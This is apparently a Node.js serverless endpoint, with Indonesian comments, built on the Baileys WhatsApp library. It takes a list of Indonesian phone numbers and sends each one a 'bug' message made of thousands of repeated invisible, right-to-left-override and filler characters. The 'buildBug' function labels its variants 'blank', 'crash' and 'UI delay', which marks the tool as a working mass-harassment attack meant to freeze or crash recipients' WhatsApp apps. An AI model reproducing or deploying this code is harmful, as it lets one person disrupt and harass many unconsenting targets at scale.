// /api/send-bug.js
const {
  makeWASocket,
  useSingleFileAuthState,
  DisconnectReason,
} = require("@whiskeysockets/baileys");
const path = require("path");
const fs = require("fs");

// lokasi penyimpanan sesi
const authFile = path.join(__dirname, "auth", "creds.json");
fs.mkdirSync(path.dirname(authFile), { recursive: true });
const { state, saveState } = useSingleFileAuthState(authFile);

let sock;
async function startSock() {
  sock = makeWASocket({
    auth: state,
    printQRInTerminal: true, // QR pertama kali muncul di log Vercel
    browser: ["BugPanel", "Vercel", "1.0"],
  });
  sock.ev.on("creds.update", saveState);
  sock.ev.on("connection.update", ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const shouldReconnect =
        lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      if (shouldReconnect) startSock();
    }
  });
}
startSock();

// generator teks bug
function buildBug(type = "ui") {
  if (type === "blank") return "\u3164".repeat(8000);
  if (type === "crash")
    return "\u200F\u202E".repeat(2500) + "ğŸ”’".repeat(400);
  return "\u200F\u202E\u2063\u3164".repeat(3000); // default UI delay
}

module.exports = async (req, res) => {
  if (req.method !== "POST")
    return res.status(405).json({ status: "Gunakan metode POST" });

  const { list, jenis } = req.body || {};
  if (!Array.isArray(list) || list.length === 0)
    return res.status(400).json({ status: "List nomor kosong" });

  // filter nomor valid (harus diawali 62 dan angka saja)
  const targets = list.filter((n) => /^62\d+$/.test(n));

  if (targets.length === 0)
    return res.status(400).json({ status: "Tidak ada nomor valid" });

  const bugText = buildBug(jenis);
  const results = [];

  for (const num of targets) {
    const jid = `${num}@s.whatsapp.net`;
    try {
      await sock.sendMessage(jid, { text: bugText });
      results.push({ num, ok: true });
    } catch (e) {
      results.push({ num, ok: false, err: e.message });
    }
  }

  res.status(200).json({ status: "Selesai", results });
};
